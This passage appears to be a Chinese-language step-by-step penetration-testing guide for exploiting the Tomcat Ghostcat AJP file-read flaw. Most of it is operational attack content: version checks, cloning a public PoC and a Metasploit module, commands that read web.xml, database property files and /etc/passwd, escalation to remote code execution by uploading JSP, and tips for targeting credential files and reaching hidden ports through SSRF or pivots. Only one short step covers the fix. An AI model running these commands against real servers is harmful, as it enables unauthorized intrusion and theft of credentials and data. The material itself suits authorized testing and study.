预期结果：8009 显示 open → 继续。如果不行：端口不通时目标可能绑定了内网回环或防火墙拦截，需要通过内网其他机器/SSRF 中转访问；或干脆认定该目标不受此漏洞影响。

#### 第 2 步：确认 Tomcat 版本
访问 8080 看版本指纹，核对该版本是否在受影响清单内：

```bash
curl -i http://target:8080/
# 访问一个不存在的路径，看 Tomcat 报错页的版本行
```

| 版本线 | 受影响范围 | 修复版本 |
| --- | --- | --- |
| 9.0.x | ≤ 9.0.30（含 M1 起） | 9.0.31 |
| 8.5.x | ≤ 8.5.50 | 8.5.51 |
| 7.0.x | ≤ 7.0.99 | 7.0.100 |

预期结果：版本落在受影响列 → 漏洞大概率存在。如果不行：版本已修复（≥ 9.0.31 等）→ 除非 AJP 配置了旧版 jar，否则跳过。

#### 第 3 步：获取 Ghostcat PoC 脚本
两个常用来源，任选其一：

```bash
# Python 版 PoC
git clone https://github.com/00theway/Ghostcat-CNVD-2020-10487
cd Ghostcat-CNVD-2020-10487

# 或用 Metasploit 内置模块
msfconsole -q
msf6 > use auxiliary/admin/http/tomcat_ghostcat
```

预期结果：脚本就位。如果不行：网络受限拉不到 PoC，就手写一个最小 AJP 请求（构造 `javax.servlet.include.request_uri` 属性），或换能访问外网的环境执行。

#### 第 4 步：读取 WEB-INF/web.xml
默认读取目标是 `WEB-INF/web.xml`（WEB-INF 目录对浏览器不可直接访问，但 AJP 能拿到）：

```bash
python3 ghostcat.py -p 8009 -f WEB-INF/web.xml http://target
```

预期结果：脚本回显 `web.xml` 的全部内容——包含 servlet 映射、过滤器、初始化参数等。如果不行：报连接错误 → 确认端口与协议；回显为空 → 试带前导斜杠的绝对路径 `/WEB-INF/web.xml`。

#### 第 5 步：读取其他任意文件
漏洞本质是任意文件读取，指定任意相对/绝对路径即可扩大战果：

```bash
# 读数据库配置、密钥、源码
python3 ghostcat.py -p 8009 -f WEB-INF/classes/db.properties http://target
python3 ghostcat.py -p 8009 -f /etc/passwd http://target
```

预期结果：配置文件内容回显。如果不行：报"路径不存在"就换候选路径；注意 AJP 读取基于 Servlet 容器的资源查找，有些系统文件路径可能访问不到，优先读应用内文件。

#### 第 6 步：升级为 RCE（可选）
纯 LFI 是信息泄露，配合两点可升级 getshell：一是读到的 web.xml/配置给出应用绝对路径，往可写目录 PUT/上传 JSP 后再读一遍让 Tomcat 解析执行；二是 PoC 的 `allowCustomServlet` 请求属性变体直接让容器加载并执行指定 JSP。实战常见组合是"Ghostcat 读配置 → 拿到数据源或上传点 → 写 JSP → 访问执行"。

```bash
# 先确认应用部署路径，为后续写入定位
python3 ghostcat.py -p 8009 -f WEB-INF/classes/application.properties http://target
```

预期结果：拿到路径线索，按线索寻找可写目录。如果不行：读到的配置没有绝对路径，就结合 manager/PUT 条目（见本组前两条）完成 RCE。

#### 第 7 步：修复建议与返回值核对
临时验证完成后，按官方方案闭环（若目标是授权靶场，修复建议用于写报告）：

> [!danger] 修复：不用 AJP 就直接注释掉 `server.xml` 里的 `<Connector port="8009" protocol="AJP/1.3"/>`；必须用则升级到修复版本，并设置 `secretRequired="true"` 与随机强 `secret`，仅绑定内网地址。

#### 常见错误与排查
| 现象 | 原因 | 解决 |
| --- | --- | --- |
| 8009 connect 失败 | 端口未暴露或协议不是 AJP | 用 nmap 确认；通过内网跳板/SSRF 转发访问 |
| 读 web.xml 回显为空 | 目标路径写法不对 | 试 `/WEB-INF/web.xml` 绝对路径，或换其他文件确认漏洞真实存在 |
| PoC 报 python 语法错误 | 拿到的脚本是 python2 版本 | 换 `python2` 执行，或改用 Metasploit 的 tomcat_ghostcat 模块 |
| 请求超时/连接被重置 | 中间有代理干扰二进制 AJP 流量 | 关闭代理直连 8009；确认不是 HTTP 代理端口 |
| 目标响应一切正常但读不到文件 | 目标已修复或 secret 已配置 | 核对版本表；升级后该思路失效，换 manager 思路 |

#### 实战要点
- 8009 open 不等于一定中招，但"默认配置不加 secret"的老环境命中率极高，先 nmap 后读 web.xml。
- 高价值读取目标：`WEB-INF/web.xml`、`WEB-INF/classes/*.properties`、`conf/tomcat-users.xml`、`server.xml`。
- LFI 拿到的东西要物尽其用：数据库口令、上传路径、gadget 名称，都是下一步 RCE 的弹药。
- 端口隐蔽（8009 不在常规扫描范围），主动扫一遍目标全端口，Ghostcat 常常是"意外捡到"的洞。
- 修复闭环：关 AJP / 升版本 / 加 secret，三选一写进报告即可。